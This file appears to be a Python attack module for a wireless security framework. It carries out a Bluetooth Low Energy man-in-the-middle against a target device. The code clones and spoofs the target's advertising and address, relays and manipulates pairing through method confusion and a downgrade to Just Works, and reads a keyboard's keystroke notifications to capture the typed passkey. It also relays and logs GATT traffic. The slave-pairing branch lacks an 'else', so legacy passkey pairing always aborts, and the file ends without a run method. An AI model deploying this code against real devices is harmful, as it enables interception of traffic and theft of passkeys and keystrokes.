import threading
from enum import IntEnum
from mirage.libs import utils, ble
from mirage.core import module
from mirage.libs.ble_utils.sc_crypto import CryptoUtils
from mirage.libs.ble_utils.packets import *
from mirage.libs.ble_utils.dissectors import *
from mirage.libs import io
from mirage.libs.ble_utils.ble_sc_pairing import BLESecureConnectionsPairingMaster, BLESecureConnectionsPairingSlave
from mirage.libs.ble_utils.ble_legacy_pairing import BLELegacyPairingMaster, BLELegacyPairingSlave
from mirage.libs.ble_utils.constants import LL_ERROR_CODES as errorCode

class BLEMitmStage(IntEnum):
    SCAN = 1
    CLONE = 2
    WAIT_CONNECTION = 3
    MASTER_CONNECTION = 4
    ACTIVE_MITM = 5
    STOP = 6


class ble_full_mitm(module.WirelessModule):
    def checkCapabilities(self):
        a2scap = self.a2sEmitter.hasCapabilities(
            "COMMUNICATING_AS_MASTER", "INITIATING_CONNECTION", "SCANNING"
        )
        a2mcap = self.a2mEmitter.hasCapabilities(
            "COMMUNICATING_AS_SLAVE", "RECEIVING_CONNECTION", "ADVERTISING"
        )
        return a2scap and a2mcap

    def init(self):
        self.technology = "ble"
        self.type = "attack"
        self.description = "Man-in-the-Middle module for Bluetooth Low Energy devices with Secure Connections Just Works"
        self.args = {
            "INTERFACE1": "hci0",  # must allow to change BD Address
            "INTERFACE2": "hci1",
            "TARGET": "FC:58:FA:A1:26:6B",
            "CONNECTION_TYPE": "public",
            "SLAVE_SPOOFING": "yes",
            "MASTER_SPOOFING": "no",
            "ADVERTISING_STRATEGY": "preconnect",  # "preconnect" (btlejuice) or "flood" (gattacker)
            "SHOW_SCANNING": "yes",
            "SCENARIO": "",
            "PACKET_TRACE": "",
            "COMMAND": "",
            "DUCKYSCRIPT": "",
            "KEYSTROKE_UUID":"",
            "SLAVE_PAIRING":"", # "SC_JW", "SC_PASS", "SC_NUM", "LP_JW", "LP_PASS"
            "MASTER_PAIRING":"" # "SC_JW", "SC_PASS", "SC_NUM", "LP_JW", "LP_PASS"
        }
        self.stage = BLEMitmStage.SCAN

        # CLONE stage related
        self.addrType = None
        self.address = None
        self.intervalMin = None
        self.intervalMax = None
        self.dataAdvInd = None
        self.dataScanRsp = None
        
        # Values from UpdateConnectionParametersRequest
        self.timeoutMult = None
        self.slaveLatency = None
        self.minInterval = None
        self.maxInterval = None

        # Pairing related
        self.a2sPairing = None
        self.a2mPairing = None
        self.pairingRequestPkt = None

        self.pairingData = {
                "pReq": None,
                "pRes": None,
                "mRand": None,
                "mConfirm": None,
                "sRand": None,
                "sConfirm": None,
                "forgedsRand": None,
                "temporaryKey": None,
                "pin": None,
                "shortTermKey": None,
                "ediv": None,
                "rand": None
            }
        # Possible pairings: "SC_JW", "SC_PASS", "SC_NUM", "LP_JW", "LP_PASS"
        self.a2mPairing  = None
        self.a2sPairing = None
        self.isMethodConfusion = False
        self.isHIDAttack = False
        self.isDowngrade = False

        # Mutex for pairing finished check
        self.mutex = threading.Lock()

        # MTU related
        self.mtuRequest = None
        self.mtuResponse = None

        # HIDAttack
        self.hidKeystrokeRegisterUUID = int(0x002b)
        self.hidKeystrokeNotifyUUID = int(0x0013)
        self.slaveHIDReady = False
        self.slaveDiscoveryStartHandle = 0x0001
        self.slaveDiscoveryEndHandle = 0xFFFF
        self.hidMap = HIDMapping(locale="de")
        self.passkey = ""
        self.masterInDiscovery = False

    def setPairingMethods(self):
        io.info("Pairing")
        if self.args["MASTER_PAIRING"]=="SC_JW":
            self.a2mPairing = BLESecureConnectionsPairingSlave(ble.PairingMethods.JUST_WORKS)
        elif self.args["MASTER_PAIRING"]=="SC_PASS":
            self.a2mPairing = BLESecureConnectionsPairingSlave(ble.PairingMethods.PASSKEY_ENTRY)
        elif self.args["MASTER_PAIRING"]=="SC_NUM":
            self.a2mPairing = BLESecureConnectionsPairingSlave(ble.PairingMethods.NUMERIC_COMPARISON)
        elif self.args["MASTER_PAIRING"]=="LP_JW":
            self.a2mPairing = BLELegacyPairingSlave(ble.PairingMethods.JUST_WORKS)
        elif self.args["MASTER_PAIRING"]=="LP_PASS":
            self.a2mPairing = BLELegacyPairingSlave(ble.PairingMethods.PASSKEY_ENTRY)
        else:
            io.fail("Master unknown pairing method")
            self.setStage(BLEMitmStage.STOP)
            return

        if self.args["SLAVE_PAIRING"]=="SC_JW":
            self.a2sPairing = BLESecureConnectionsPairingMaster(ble.PairingMethods.JUST_WORKS)
        elif self.args["SLAVE_PAIRING"]=="SC_PASS":
            self.a2sPairing = BLESecureConnectionsPairingMaster(ble.PairingMethods.PASSKEY_ENTRY)
        elif self.args["SLAVE_PAIRING"]=="SC_NUM":
            self.a2sPairing = BLESecureConnectionsPairingMaster(ble.PairingMethods.NUMERIC_COMPARISON)
        elif self.args["SLAVE_PAIRING"]=="LP_JW":
            self.a2sPairing = BLELegacyPairingMaster(ble.PairingMethods.JUST_WORKS)
        elif self.args["SLAVE_PAIRING"]=="LP_PASS":
            self.a2sPairing = BLELegacyPairingMaster(ble.PairingMethods.PASSKEY_ENTRY)
            io.fail("Slave unknown pairing method")
            self.setStage(BLEMitmStage.STOP)
            return
        
        # Setting Attack Mode
        self.isMethodConfusion = False
        self.isHIDAttack = False
        self.isDowngrade = False
        if self.a2mPairing.pairingMethod==ble.PairingMethods.NUMERIC_COMPARISON and self.a2sPairing.pairingMethod==ble.PairingMethods.PASSKEY_ENTRY:
            self.isMethodConfusion = True
            io.info(f'Using Method Confusion')
        elif self.a2mPairing.pairingMethod==ble.PairingMethods.PASSKEY_ENTRY and self.a2sPairing.pairingMethod==ble.PairingMethods.JUST_WORKS:
            if self.args["KEYSTROKE_UUID"]:
                self.hidKeystrokeNotifyUUID = int(self.args["KEYSTROKE_UUID"])
                self.hidKeystrokeRegisterUUID = self.hidKeystrokeNotifyUUID + 1

            self.isHIDAttack = True
            io.info(f'Using HID Attack')
        else:
            self.isDowngrade = True
            if self.a2mPairing.pairingMethod==ble.PairingMethods.JUST_WORKS and self.a2sPairing.pairingMethod==ble.PairingMethods.JUST_WORKS:
                io.info(f'Using Downgrade Attack')
            else:
                io.warning(f'Don\'t know how to handle pairings. Using Downgrade Attack -> Master: Just Works, Slave: Just Works')
                if self.args["MASTER_PAIRING"][:2]=="SC":
                    self.a2sPairing = BLESecureConnectionsPairingMaster(ble.PairingMethods.JUST_WORKS)
                else:
                    self.a2sPairing = BLELegacyPairingMaster(ble.PairingMethods.JUST_WORKS)
                if self.args["SLAVE_PAIRING"][:2]=="SC":
                    self.a2mPairing = BLESecureConnectionsPairingSlave(ble.PairingMethods.JUST_WORKS)
                else:
                    self.a2mPairing = BLELegacyPairingSlave(ble.PairingMethods.JUST_WORKS)

        io.info(f'Using Master Pairing: {self.args["MASTER_PAIRING"]}')
        io.info(f'Using Slave Pairing: {self.args["SLAVE_PAIRING"]}')

    # Scenario-related methods
    @module.scenarioSignal("onStart")
    def startScenario(self):
        pass

    @module.scenarioSignal("onEnd")
    def endScenario(self, result):
        return result

    def initMitMDevices(self):
        attackerToSlaveInterface = self.args["INTERFACE1"]
        attackerToMasterInterface = self.args["INTERFACE2"]

        self.a2sEmitter = self.getEmitter(interface=attackerToSlaveInterface)
        self.a2sReceiver = self.getReceiver(interface=attackerToSlaveInterface)
        self.a2sReceiver.enableRecvOfTransmittedLLPackets(True)

        self.a2mEmitter = self.getEmitter(interface=attackerToMasterInterface)
        self.a2mReceiver = self.getReceiver(interface=attackerToMasterInterface)
        self.a2mReceiver.enableRecvOfTransmittedLLPackets(True)

        if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(
            self.args["SLAVE_SPOOFING"]
        ):
            io.warning(
                "Interface "
                + attackerToMasterInterface
                + " is not able to change its address : "
                "Slave address spoofing will not be enabled !"
            )

        if not self.a2sEmitter.isAddressChangeable() and utils.booleanArg(
            self.args["MASTER_SPOOFING"]
        ):
            io.warning(
                "Interface "
                + attackerToMasterInterface
                + " is not able to change its address : "
                "Master address spoofing will not be enabled !"
            )

    def initPacketLogDevices(self):
        self.sPacketLogger = self.getEmitter(
            interface="slave_" + self.args["PACKET_TRACE"]
        )
        self.mPacketLogger = self.getEmitter(
            interface="master_" + self.args["PACKET_TRACE"]
        )

    # Configuration methods
    def initEmittersAndReceivers(self):
        self.initMitMDevices()
        if self.args["PACKET_TRACE"] != "":
            self.initPacketLogDevices()

    # Stage related methods
    def getStage(self):
        return self.stage

    @module.scenarioSignal("onStageChange")
    def setStage(self, value):
        self.stage = value

    def waitUntilStage(self, stage):
        while self.getStage() != stage:
            utils.wait(seconds=0.01)

    def checkPairingComplete(self):
        self.mutex.acquire()
        io.fail("Check if ACTIVE_MITM stage ...")
        if self.a2sPairing.isPairingFinished() and self.a2mPairing.isPairingFinished():
            self.setStage(BLEMitmStage.ACTIVE_MITM)
            io.success("Entering ACTIVE_MITM stage ...")

        self.mutex.release()

    # Advertising related methods
    @module.scenarioSignal("onSlaveAdvertisement")
    def scanStage(self, packet):
        if utils.booleanArg(self.args["SHOW_SCANNING"]):
            io.info(f"Slave: {packet}")
        if self.getStage() == BLEMitmStage.SCAN:
            if utils.addressArg(self.args["TARGET"]) == packet.addr.upper():
                if packet.type == "ADV_IND":
                    self.address = utils.addressArg(self.args["TARGET"])
                    data = packet.getRawDatas()
                    self.intervalMin = packet.intervalMin
                    self.intervalMax = packet.intervalMax
                    self.addrType = packet.addrType
                    self.dataAdvInd = data
                elif packet.type == "SCAN_RSP":
                    self.dataScanRsp = packet.getRawDatas()

            if self.dataAdvInd is not None and self.dataScanRsp is not None:
                self.cloneStage(
                    self.address,
                    self.dataAdvInd,
                    self.dataScanRsp,
                    self.intervalMin,
                    self.intervalMax,
                    self.addrType,
                )

    @module.scenarioSignal("onCloning")
    def cloneStage(
        self, address, data, dataResponse, intervalMin, intervalMax, addrType
    ):
        io.success("Entering CLONE stage ...")
        self.setStage(BLEMitmStage.CLONE)

        if self.args["ADVERTISING_STRATEGY"] == "flood":
            intervalMin = 33
            intervalMax = 34

        if utils.booleanArg(self.args["SLAVE_SPOOFING"]):
            if address != self.a2mEmitter.getAddress():
                self.a2mEmitter.setAddress(address, random=1 == addrType)

            self.masterLocalAddress = address
            self.masterLocalAddressType = addrType
        else:
            self.masterLocalAddress = self.a2mEmitter.getAddress()
            self.masterLocalAddressType = (
                0 if self.a2mEmitter.getAddressMode() == "public" else 1
            )

        self.advData = data
        self.intervalMin = intervalMin
        self.intervalMax = intervalMax
        self.daType = addrType
        self.oaType = addrType
        self.a2mEmitter.setScanningParameters(data=dataResponse)
        self.a2mEmitter.setAdvertisingParameters(
            data=data,
            intervalMin=intervalMin,
            intervalMax=intervalMax,
            daType=addrType,
            oaType=addrType,
        )

    # Connection related methods
    @module.scenarioSignal("onSlaveConnect")
    def connectOnSlave(self, initiatorType="public"):
        while self.a2sEmitter.getMode() != "NORMAL":
            utils.wait(seconds=1)
            print(self.a2sEmitter.getMode())

        address = utils.addressArg(self.args["TARGET"])
        connectionType = self.args["CONNECTION_TYPE"]

        self.responderAddress = address
        self.responderAddressType = (
            b"\x00" if self.args["CONNECTION_TYPE"] == "public" else b"\x01"
        )
        io.info("Connecting to slave " + address + "...")
        self.a2sEmitter.sendp(
            ble.BLEConnect(
                dstAddr=address, type=connectionType, initiatorType=initiatorType
            )
        )
        while not self.a2sEmitter.isConnected():
            utils.wait(seconds=0.5)


        io.success("Connected on slave : " + self.a2sReceiver.getCurrentConnection())

        if utils.booleanArg(self.args["MASTER_SPOOFING"]):
            request = self.a2sPairing.getDefaultPairingRequest()
            if request and not self.isMethodConfusion:
                self.pairingRequestPkt = request
                io.fail(f"Slave: {request}")
                self.a2sEmitter.sendp(request)

    @module.scenarioSignal("onMasterConnect")
    def connect(self, packet):
        if self.getStage() == BLEMitmStage.WAIT_CONNECTION:
            self.setStage(BLEMitmStage.MASTER_CONNECTION)
            io.success("Master connected : " + packet.srcAddr)

            if self.args["ADVERTISING_STRATEGY"] == "preconnect" and utils.booleanArg(
                self.args["MASTER_SPOOFING"]
            ):
                self.a2sEmitter.sendp(ble.BLEDisconnect())
                while self.a2sEmitter.isConnected():
                    utils.wait(seconds=0.01)
                io.info("Giving slave 1s time to reset...")
                utils.wait(seconds=1)

            if self.a2mPairing.isPairingFinished():
                self.a2mPairing.reestablishEncryption()
            else:
                if utils.booleanArg(self.args["MASTER_SPOOFING"]):
                    self.a2sEmitter.setAddress(
                        packet.srcAddr, random=packet.type == "random"
                    )
                    self.slaveLocalAddress = packet.srcAddr
                    self.slaveLocalAddressType = 0 if packet.type == "public" else 1

                if utils.booleanArg(self.args["MASTER_SPOOFING"]):
                    self.connectOnSlave(packet.type)
                elif self.args["ADVERTISING_STRATEGY"] == "flood":
                    self.connectOnSlave()
                else:
                    request = self.a2sPairing.getDefaultPairingRequest()
                    if request and not self.isMethodConfusion:
                        self.pairingRequestPkt = request
                        io.info(f"Slave: {request}")
                        self.a2sEmitter.sendp(request)

    @module.scenarioSignal("onMasterDisconnect")
    def disconnectMaster(self, packet):
        io.fail("Master disconnected !")
        if self.getStage() == BLEMitmStage.ACTIVE_MITM:
            self.setStage(BLEMitmStage.STOP)

    @module.scenarioSignal("onSlaveDisconnect")
    def disconnectSlave(self, packet):
        io.fail("Slave disconnected !")
        if self.getStage() == BLEMitmStage.ACTIVE_MITM:
            self.setStage(BLEMitmStage.STOP)

    # Slave Pairing releated callbacks
    @module.scenarioSignal("onSlaveSecurityRequest")
    def securityRequest(self, packet):
        io.info(f"Slave: {packet}")
  
        request = self.a2sPairing.getDefaultPairingRequest()
        if request and not self.isMethodConfusion:
            self.pairingRequestPkt = request
            self.a2sEmitter.sendp(request)

    @module.scenarioSignal("onSlavePairingResponse")
    def pairingResponse(self, packet):
        io.info(f"Slave: {packet}")

        slaveLocalAddress = self.a2sEmitter.getAddress()
        slaveLocalAddressType = (
            0 if self.a2sEmitter.getAddressMode() == "public" else 1
        )

        slaveRemoteAddress = self.a2sEmitter.getCurrentConnection()
        slaveRemoteAddressType = (
            0 if self.a2sEmitter.getCurrentConnectionMode() == "public" else 1
        )

        slaveResponderAuthReq = ble.AuthReqFlag(
            data=bytes([packet.authentication])
        )
        slaveResponderInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )

        (
            self.slaveSecureConnections,
            self.slavePairingMethod,
        ) = self.a2sPairing.updatePairingMethod(
            packet.outOfBand,
            slaveResponderAuthReq,
            slaveResponderInputOutputCapability,
        )
        
        for response in  self.a2sPairing.pairingResponse(packet,slaveLocalAddress,slaveLocalAddressType,slaveRemoteAddress,slaveRemoteAddressType):
            io.info(f"Slave: {response}")
            self.a2sEmitter.sendp(response)

    @module.scenarioSignal("onSlavePublicKey")
    def slavePublicKey(self, packet):
        io.info(f"Slave: {packet}")
        responses = self.a2sPairing.publicKey(packet)
        for packet in responses:
            self.a2sEmitter.sendp(packet)
            io.info(f"Slave: {packet}")

    @module.scenarioSignal("onSlavePairingConfirm")
    def slavePairingConfirm(self, packet):
        io.info(f"Slave: {packet}")
        responses = self.a2sPairing.pairingConfirm(packet)
        for response in responses:
            io.info(f"Slave: {response}")
            self.a2sEmitter.sendp(response)

    @module.scenarioSignal("onSlavePairingRandom")
    def slavePairingRandom(self, packet):
        io.info(f"Slave: {packet}")
        responses = self.a2sPairing.pairingRandom(packet)
        for packet in responses:
            self.a2sEmitter.sendp(packet)
            io.info(f"Slave: {packet}")

    @module.scenarioSignal("onSlaveDHKeyCheck")
    def slaveDHKeyCheck(self, packet):
        io.info(f"Slave: {packet}")
        responses = self.a2sPairing.DHKeyCheck(packet)
        for packet in responses:
            self.a2sEmitter.sendp(packet)
            io.info(f"Slave: {packet}")

    @module.scenarioSignal("onSlaveEncryptionChange")
    def slaveEncryptionChange(self, packet):
        io.info(f"Slave: {packet}")
        (finished,failure,responses) = self.a2sPairing.encryptionChange(packet)
        if finished:
            self.checkPairingComplete()
            if self.isHIDAttack:
                # We have to discover before we can register for the keystrokes
                self.primaryServicesDiscovery()
        if failure:
            io.fail("Slave Encryption failed...")
        else:
            for response in responses:     
                io.info(f"Slave: {response}") 
                self.a2mEmitter.sendp(response)
        
    def servicesDiscovery(self, uuid, packet):
        if not packet or isinstance(packet, ble.BLEReadByGroupTypeResponse):
            if packet:
                self.slaveDiscoveryEndHandle = packet.attributes[-1]["endGroupHandle"] + 1
            
            request = ble.BLEReadByGroupTypeRequest(
                startHandle=self.slaveDiscoveryEndHandle, endHandle=self.slaveDiscoveryEndHandle, uuid=uuid
            )
            self.a2sEmitter.sendp(request)
        elif isinstance(packet, ble.BLEErrorResponse):
            io.info("Registering for keystrokes")
            self.a2sEmitter.sendp(ble.BLEWriteRequest(handle=int(0x0014),value=b"\x01\x00"))
        elif isinstance(packet, ble.BLEWriteResponse):
            self.slaveHIDReady = True

    def primaryServicesDiscovery(self, packet=None):
        uuid = ble.UUID(name="Primary Service").UUID16
        self.servicesDiscovery(uuid, packet)

    # Master Pairing related callbacks
    @module.scenarioSignal("onMasterPairingRequest")
    def pairingRequest(self, packet):
        self.masterRemoteAddress = self.a2mEmitter.getCurrentConnection()
        self.masterRemoteAddressType = (
            0 if self.a2mEmitter.getCurrentConnectionMode() == "public" else 1
        )

        masterInitiatorAuthReq = ble.AuthReqFlag(
            data=bytes([packet.authentication])
        )
        masterInitiatorInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )
        (
            secureConnections,
            pairingMethod,
        ) = self.a2mPairing.updatePairingMethod(
            packet.outOfBand,
            masterInitiatorAuthReq,
            masterInitiatorInputOutputCapability
        )
        responses = self.a2mPairing.pairingRequest(packet, self.masterRemoteAddress,self.masterRemoteAddressType,self.masterLocalAddress,self.masterLocalAddressType)

        if not self.pairingRequestPkt and not self.isMethodConfusion:
            self.pairingRequestPkt = ble.BLEPairingRequest(
                    outOfBand=packet.outOfBand,
                    inputOutputCapability=packet.inputOutputCapability,
                    authentication=packet.authentication,
                    maxKeySize=packet.maxKeySize,
                    initiatorKeyDistribution=packet.initiatorKeyDistribution,
                    responderKeyDistribution=packet.responderKeyDistribution,
                )
            self.a2sEmitter.sendp(self.pairingRequestPkt)
            io.info(f"Slave: {self.pairingRequestPkt}")

        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  

    @module.scenarioSignal("onMasterPublicKey")
    def masterPublicKey(self, packet):
        io.info(f"Master: {packet}")
        responses = self.a2mPairing.publicKey(packet)
        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  
        
    @module.scenarioSignal("onMasterConfirmValue")
    def masterConfirmValue(self, packet):
        io.info("Master {}".format(packet))
        responses = self.a2mPairing.pairingConfirm(packet)
        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  

    @module.scenarioSignal("onMasterPairingRandom")
    def masterPairingRandom(self, packet):
        io.info(f"Master: {packet}")
        responses = self.a2mPairing.pairingRandom(packet)
        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  
        if packet and True: 
            io.info("Compare value: {}".format(self.a2mPairing.getCompareValue()))
            self.a2sPairing.setPassKey(self.a2mPairing.getCompareValue())            
            
            request = self.a2sPairing.getDefaultPairingRequest()

            # Start pairing with slave for Method confusion
            if self.isMethodConfusion:
                self.pairingRequestPkt = request
                self.a2sEmitter.sendp(request)
                io.info(f"Slave: {request}")  

    @module.scenarioSignal("onMasterDHKeyCheck")
    def masterDHKeyCheck(self, packet):
        io.info(f"Master: {packet}")
        responses = self.a2mPairing.DHKeyCheck(packet)
        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  

    @module.scenarioSignal("onLongTermKeyRequest")
    def longTermKeyRequest(self, packet):
        io.info(f"Master: {packet}")
        responses = self.a2mPairing.longTermKeyRequest(packet)
        for response in responses:        
            self.a2mEmitter.sendp(response)
            io.info(f"Master: {response}")  

    @module.scenarioSignal("onMasterEncryptionChange")
    def masterEncryptionChange(self, packet):
        io.info(f"Master: {packet}")
        (finished, failed, responses) = self.a2mPairing.encryptionChange(packet)
        if not failed:
            for response in responses:     
                io.info(f"Master: {response}")    
                self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onMasterPairingFailed")
    def masterPairingFailed(self, packet):
        io.info("Pairing Failed (from master) !")
        self.a2mPairing.pairingFailed(packet)

    @module.scenarioSignal("onSlavePairingFailed")
    def slavePairingFailed(self, packet):
        io.info("Pairing Failed (from slave) !")
        self.a2sPairing.pairingFailed(packet)

    @module.scenarioSignal("onSlaveEncryptionInformation")
    def slaveEncryptionInformation(self, packet):
        io.info("Identity Information (from slave) : irk = " + packet.irk.hex())
        self.a2sPairing.encryptionInformation(packet)
    
    @module.scenarioSignal("onSlaveMasterIdentification")
    def slaveMasterIdentification(self, packet):
        io.info("Identity Information (from slave) : irk = " + packet.irk.hex())
        self.a2sPairing.masterIdentification(packet)

    @module.scenarioSignal("onSlaveIdentityAddressInformation")
    def slaveIdentityAddressInformation(self, packet):
        io.info(f"Slave: {packet}")
        (slavePaired, responses) = self.a2sPairing.identityAddressInformation(packet)
        
        for response in responses:  
            io.info(f"Slave: {response}")      
            self.a2sEmitter.sendp(response)
        
        if slavePaired: 
            self.checkPairingComplete()

    @module.scenarioSignal("onSlaveIdentityInformation")
    def slaveIdentityInformation(self, packet):
        io.info("Identity Information (from slave) : irk = " + packet.irk.hex())
        self.a2sPairing.identityInformation(packet)

    @module.scenarioSignal("onSlaveSigningInformation")
    def slaveSigningInformation(self, packet):
        io.info("Signing Information (from slave) : csrk = " + packet.csrk.hex())
        (slavePaired, responses) = self.a2sPairing.signingInformation(packet)
        
        for response in responses:        
            self.a2sEmitter.sendp(response)

        if slavePaired: 
            self.checkPairingComplete()

    @module.scenarioSignal("onMasterEncryptionInformation")
    def masterEncryptionInformation(self, packet):
        io.info("Encryption Information (from master) : irk = " + packet.irk.hex())
        self.a2sPairing.encryptionInformation(packet)
    
    @module.scenarioSignal("onMasterMasterIdentification")
    def masterMasterIdentification(self, packet):
        io.info("Master Information (from master) : irk = " + packet.irk.hex())
        self.a2sPairing.masterIdentification(packet)
        
    @module.scenarioSignal("onMasterIdentityAddressInformation")
    def masterIdentityAddressInformation(self, packet):
        io.info(f"Master: {packet}")
        (masterPaired, responses) = self.a2mPairing.identityAddressInformation(packet)
        
        for response in responses:        
            self.a2mEmitter.sendp(response)
        
        if masterPaired: 
            self.checkPairingComplete()

    @module.scenarioSignal("onMasterIdentityInformation")
    def masterIdentityInformation(self, packet):
        io.info("Identity Information (from master) : irk = " + packet.irk.hex())
        self.masterRemoteIRK = packet.irk

    @module.scenarioSignal("onMasterSigningInformation")
    def masterSigningInformation(self, packet):
        io.info("Signing Information (from master) : csrk = " + packet.csrk.hex())
        (masterPaired, responses) = self.a2mPairing.signingInformation(packet)
        
        for response in responses:        
            self.a2mEmitter.sendp(response)
        
        if masterPaired: 
            self.checkPairingComplete()

    def forwardToSlave(self, packet):
        if self.a2sEmitter.isConnected():
            io.info("Redirecting to slave ...")
            self.a2sEmitter.sendp(packet)

    def forwardToMaster(self, packet):
        if self.isHIDAttack and not self.slaveHIDReady:
            io.info(f"{packet}")
            self.primaryServicesDiscovery(packet=packet)
        elif self.isHIDAttack and not self.masterInDiscovery:
            pass
        elif self.a2mEmitter.isConnected():
            io.info("Redirecting to master ...")
            self.a2mEmitter.sendp(packet)

    @module.scenarioSignal("onMasterExchangeMTURequest")
    def exchangeMtuRequest(self, packet):
        io.success("Exchange MTU Request (from master) : mtu = " + str(packet.mtu))
        if not self.mtuRequest:
            self.mtuRequest = packet
        if not self.mtuResponse:
            self.forwardToSlave(ble.BLEExchangeMTURequest(mtu=packet.mtu))
        else:
            self.a2mEmitter.sendp(ble.BLEExchangeMTUResponse(mtu=self.mtuResponse.mtu))

    @module.scenarioSignal("onSlaveExchangeMTUResponse")
    def exchangeMtuResponse(self, packet):
        io.info("Exchange MTU Response (from slave) : mtu = " + str(packet.mtu))
        if not self.mtuResponse:
            self.mtuResponse = packet
        self.forwardToMaster(ble.BLEExchangeMTUResponse(mtu=packet.mtu))

    @module.scenarioSignal("onMasterErrorResponse")
    def masterErrorResponse(self, packet):
        io.info(
            "Error Response (from master) : request = "
            + hex(packet.request)
            + " / handle = "
            + hex(packet.handle)
            + " / ecode = "
            + hex(packet.ecode)
        )
        self.forwardToSlave(
            ble.BLEErrorResponse(
                request=packet.request, handle=packet.handle, ecode=packet.ecode
            )
        )

    @module.scenarioSignal("onMasterWriteCommand")
    def writeCommand(self, packet):
        io.info(
            "Write Command (from master) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )
        self.forwardToSlave(
            ble.BLEWriteCommand(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onMasterWriteRequest")
    def writeRequest(self, packet):
        io.info(
            "Write Request (from master) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )
        self.forwardToSlave(
            ble.BLEWriteRequest(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onSlaveWriteResponse")
    def writeResponse(self, packet):
        io.info("Write Response (from slave)")
        self.forwardToMaster(ble.BLEWriteResponse())

    @module.scenarioSignal("onMasterReadBlobRequest")
    def readBlob(self, packet):
        io.info(
            "Read Blob Request (from master) : handle = "
            + hex(packet.handle)
            + " / offset = "
            + str(packet.offset)
        )
        self.forwardToSlave(
            ble.BLEReadBlobRequest(handle=packet.handle, offset=packet.offset)
        )

    @module.scenarioSignal("onSlaveReadBlobResponse")
    def readBlobResponse(self, packet):
        io.info("Read Blob Response (from slave) : value = " + packet.value.hex())
        self.forwardToMaster(ble.BLEReadBlobResponse(value=packet.value))

    @module.scenarioSignal("onMasterReadRequest")
    def read(self, packet):
        io.info("Read Request (from master) : handle = " + hex(packet.handle))

        self.forwardToSlave(ble.BLEReadRequest(handle=packet.handle))

    @module.scenarioSignal("onSlaveReadResponse")
    def readResponse(self, packet):
        io.info("Read Response (from slave) : value = " + packet.value.hex())

        self.forwardToMaster(ble.BLEReadResponse(value=packet.value))

    @module.scenarioSignal("onSlaveErrorResponse")
    def slaveErrorResponse(self, packet):
        io.info(
            "Error Response (from slave) : request = "
            + hex(packet.request)
            + " / handle = "
            + hex(packet.handle)
            + " / ecode = "
            + hex(packet.ecode)
        )

        self.forwardToMaster(
            ble.BLEErrorResponse(
                request=packet.request, handle=packet.handle, ecode=packet.ecode
            )
        )

    @module.scenarioSignal("onSlaveHandleValueNotification")
    def notification(self, packet):
        io.info(
            "Handle Value Notification (from slave) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )

        if self.isHIDAttack and self.getStage()!=BLEMitmStage.ACTIVE_MITM and self.slaveHIDReady:
            key = self.hidMap.getKeyFromHIDCode(
                modifiers=packet.value[0], hid=packet.value[1]
            )
            if key=="ENTER":
                io.fail(f"{self.passkey}")
                self.a2mPairing.setPassKey(self.passkey)
            elif key !="":
                self.passkey = self.passkey + key
        self.forwardToMaster(
            ble.BLEHandleValueNotification(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onSlaveHandleValueIndication")
    def indication(self, packet):
        io.info(
            "Handle Value Indication (from slave) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )

        self.forwardToMaster(
            ble.BLEHandleValueIndication(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onMasterHandleValueConfirmation")
    def confirmation(self, packet):
        io.info("Handle Value Confirmation (from master)")
        self.forwardToSlave(ble.BLEHandleValueConfirmation())

    @module.scenarioSignal("onMasterFindInformationRequest")
    def findInformation(self, packet):
        io.info(
            "Find Information Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
        )
        self.forwardToSlave(
            ble.BLEFindInformationRequest(
                startHandle=packet.startHandle, endHandle=packet.endHandle
            )
        )

    @module.scenarioSignal("onSlaveFindInformationResponse")
    def findInformationResponse(self, packet):
        io.info(
            "Find Information Response (from slave) : format = "
            + hex(packet.format)
            + " / data = "
            + packet.data.hex()
        )

        self.forwardToMaster(
            ble.BLEFindInformationResponse(format=packet.format, data=packet.data)
        )

    @module.scenarioSignal("onMasterFindByTypeValueRequest")
    def findByTypeValueRequest(self, packet):
        io.info(
            "Find Type By Value Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
            + " / data = "
            + packet.data.hex()
        )
        self.masterInDiscovery = True
        self.forwardToSlave(
            ble.BLEFindByTypeValueRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
                data=packet.data,
            )
        )

    @module.scenarioSignal("onSlaveFindByTypeValueResponse")
    def findByTypeValueResponse(self, packet):
        io.info("Find Type By Value Response (from slave)")
        self.forwardToMaster(ble.BLEFindByTypeValueResponse(handles=packet.handles))

    @module.scenarioSignal("onMasterReadByTypeRequest")
    def masterReadByType(self, packet):
        io.info(
            "Read By Type Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )

        self.masterInDiscovery = True
        self.forwardToSlave(
            ble.BLEReadByTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

    @module.scenarioSignal("onSlaveReadByTypeRequest")
    def slaveReadByType(self, packet):
        io.info(
            "Read By Type Request (from slave) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )

        self.forwardToMaster(ble.BLEReadByTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

